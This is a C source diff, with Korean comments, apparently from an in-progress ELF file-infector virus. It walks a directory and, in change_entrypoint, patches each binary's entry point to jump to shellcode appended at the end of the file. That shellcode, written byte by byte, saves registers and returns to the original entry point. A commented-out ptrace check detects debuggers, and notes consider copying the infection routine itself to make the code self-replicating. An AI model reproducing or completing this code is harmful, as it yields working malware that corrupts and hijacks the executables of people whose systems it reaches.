@@ -45,11 +45,8 @@ int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW 
 int main(int argc, char* argv[])
 {
 	/*
-	if(my_ptraceme(0,0,0,0)!=0){
-		printf("[ERROR] Debugger detected!\n");
-		while(1);
-		return 0;
-	}
+	if(my_ptraceme(0,0,0,0)!=0) while(1);
+		
 	*/
 	char dot[2]={'.',0};
     listdir(dot);
@@ -220,6 +217,8 @@ void change_entrypoint(const char* fpath){
 	int fd, i, shellcodeloc;
 	int is_infected_already = 1;  
 	int filesize;
+	long long int oep;
+	long long int oep_relocated;
 	Elf64_Shdr shdr;
 	Elf64_Phdr phdr;
 	Elf64_Ehdr ehdr;
@@ -256,10 +255,17 @@ void change_entrypoint(const char* fpath){
 	filesize = ehdr.e_shoff + (ehdr.e_shentsize * (ehdr.e_shnum));
 	shellcodeloc = phdr.p_vaddr + filesize; 
 	
+	// Manipulate OEP (original entry point)
+	
+	oep = ehdr.e_entry;
+	ehdr.e_entry = shellcodeloc;
+	//printf("Original : 0x%x, Changed OEP : 0x%x\n",oep,shellcodeloc);
+	my_lseek(fd, 0, SEEK_SET);
+	my_write(fd, &ehdr, sizeof(ehdr));
+	
+	
 	/*---------------------------------------------------------------------------*/
 	// Malicious section 
-	
-
 	
 	my_memset(shellcode,'\x90',0x1000);
 
@@ -276,13 +282,13 @@ void change_entrypoint(const char* fpath){
 	  *RDI  0x7ffff7ffe168 <— 0x0
 	*/
 	
-	/* 50	push   %rax    (원본rax저장. rax가 init의 리턴값을지정해주나봄.그래서망가지면안됨.) */
+	/* 50	push   %rax    (원본rax저장. rax 가 init의 리턴값을지정해주나봄. 그래서망가지면안됨.) */
 	shellcode[0] = 0x50;
 	
 	/* 48 b8 [OEP]	movabs rax,0x4141414141414141 */
 	shellcode[1] = 0x48;
 	shellcode[2] = 0xb8;
-	my_memcpy(&shellcode[3], &ehdr.e_entry, sizeof(ehdr.e_entry));
+	my_memcpy(&shellcode[3], &oep, sizeof(ehdr.e_entry));
 	
 	/* 48 03 07	add    rax,QWORD PTR [rdi]*/
 	shellcode[11] = 0x48;
@@ -290,101 +296,29 @@ void change_entrypoint(const char* fpath){
 	shellcode[13] = 0x07;
 	
 	/* 50   push   %rax */
-	shellcode[14] = 0x50;
+	shellcode[14] = 0x50;  // 오리지널 엔트리 포인트를 동적으로 계산해서 쉘코드에 저장
 	
 	
 	/*
-	write "infected" on shell
-    48 89 e5	            mov    rbp,rsp
-	c6 45 f0 69	            movb   $0x69,-0x10(%rbp)
-    c6 45 f1 6e	            movb   $0x6e,-0xf(%rbp)
-    c6 45 f2 66	            movb   $0x66,-0xe(%rbp)
-    c6 45 f3 65	            movb   $0x65,-0xd(%rbp)
-    c6 45 f4 63	            movb   $0x63,-0xc(%rbp)
-    c6 45 f5 74	            movb   $0x74,-0xb(%rbp)
-    c6 45 f6 65	            movb   $0x65,-0xa(%rbp)
-    c6 45 f7 64	            movb   $0x64,-0x9(%rbp)
-    c6 45 f8 0a	            movb   $0xa,-0x8(%rbp)
-    c6 45 f9 00	            movb   $0x0,-0x7(%rbp)
-    48 c7 c7 01 00 00 00	mov    $0x1,%rdi
-    48 c7 c0 01 00 00 00	mov    $0x1,%rax
-    48 8d 75 f0          	lea    -0x10(%rbp),%rsi
-    48 c7 c2 0b 00 00 00	mov    $0xb,%rdx
-    0f 05	                syscall 
+	// 이 코드 이전으로 프로그램 시작까지의 오프셋을 구하기
+	my_lseek(fd,0,SEEK_END);  
+	my_write(fd,shellcode,20);
+	
+	
+	my_write(fd,1,1);//my_write(fd,현재코드의 시작주소,현재코드의 사이즈); 
+	// 현재 실행되는 EIP를 보고 EIP의 시작바이트부터 끝바이트까지를 복사?
+	// EIP를 얻기
+	// start = EIP - ???를 하기
+	// my_write(fd, start, size=10000정도?)를 붙여넣기
+	
+	// memcpy로 감염루틴 복사하면되지않음?
 	*/
 	
-	shellcode[20] = '\x48';
-    shellcode[21] = '\x89';
-    shellcode[22] = '\xe5';
-    shellcode[23] = '\xc6';
-    shellcode[24] = '\x45';
-    shellcode[25] = '\xf0';
-    shellcode[26] = '\x69';
-    shellcode[27] = '\xc6';
-    shellcode[28] = '\x45';
-    shellcode[29] = '\xf1';
-    shellcode[30] = '\x6e';
-    shellcode[31] = '\xc6';
-    shellcode[32] = '\x45';
-    shellcode[33] = '\xf2';
-    shellcode[34] = '\x66';
-    shellcode[35] = '\xc6';
-    shellcode[36] = '\x45';
-    shellcode[37] = '\xf3';
-    shellcode[38] = '\x65';
-    shellcode[39] = '\xc6';
-    shellcode[40] = '\x45';
-    shellcode[41] = '\xf4';
-    shellcode[42] = '\x63';
-    shellcode[43] = '\xc6';
-    shellcode[44] = '\x45';
-    shellcode[45] = '\xf5';
-    shellcode[46] = '\x74';
-    shellcode[47] = '\xc6';
-    shellcode[48] = '\x45';
-    shellcode[49] = '\xf6';
-    shellcode[50] = '\x65';
-    shellcode[51] = '\xc6';
-    shellcode[52] = '\x45';
-    shellcode[53] = '\xf7';
-    shellcode[54] = '\x64';
-    shellcode[55] = '\xc6';
-    shellcode[56] = '\x45';
-    shellcode[57] = '\xf8';
-    shellcode[58] = '\x0a';
-    shellcode[59] = '\xc6';
-    shellcode[60] = '\x45';
-    shellcode[61] = '\xf9';
-    shellcode[62] = '\x00';
-    shellcode[63] = '\x48';
-    shellcode[64] = '\xc7';
-    shellcode[65] = '\xc7';
-    shellcode[66] = '\x01';
-    shellcode[67] = '\x00';
-    shellcode[68] = '\x00';
-    shellcode[69] = '\x00';
-    shellcode[70] = '\x48';
-    shellcode[71] = '\xc7';
-    shellcode[72] = '\xc0';
-    shellcode[73] = '\x01';
-    shellcode[74] = '\x00';
-    shellcode[75] = '\x00';
-    shellcode[76] = '\x00';
-    shellcode[77] = '\x48';
-    shellcode[78] = '\x8d';
-    shellcode[79] = '\x75';
-    shellcode[80] = '\xf0';
-    shellcode[81] = '\x48';
-    shellcode[82] = '\xc7';
-    shellcode[83] = '\xc2';
-    shellcode[84] = '\x0b';
-    shellcode[85] = '\x00';
-    shellcode[86] = '\x00';
-    shellcode[87] = '\x00';
-    shellcode[88] = '\x0f';
-    shellcode[89] = '\x05';
-	
-
+	/*
+	// 파일의 끝
+	my_lseek(fd,0,SEEK_END);  
+	my_write(fd,shellcode,100);
+	*/
 	
 	
 	// 41 5e	pop    %r14 리턴주소꺼내기
@@ -392,21 +326,14 @@ void change_entrypoint(const char* fpath){
 	shellcode[91] = '\x5e';
 	// 58	pop    %rax  rax꺼내기
 	shellcode[92] = '\x58';
-	//	41 ff e6	jmpq   *%r14
+	// 41 ff e6	jmpq   *%r14
 	shellcode[93] = '\x41';
 	shellcode[94] = '\xff';
 	shellcode[95] = '\xe6';
 	
 	// 파일의 끝
 	my_lseek(fd,0,SEEK_END);  
-	
-	
 	my_write(fd,shellcode,0x1000);
 	
-	//엔트리포인트 수정하기
-	ehdr.e_entry = shellcodeloc;
-	my_lseek(fd, 0, SEEK_SET);
-	my_write(fd, &ehdr, sizeof(ehdr));
+	
 }
-
-
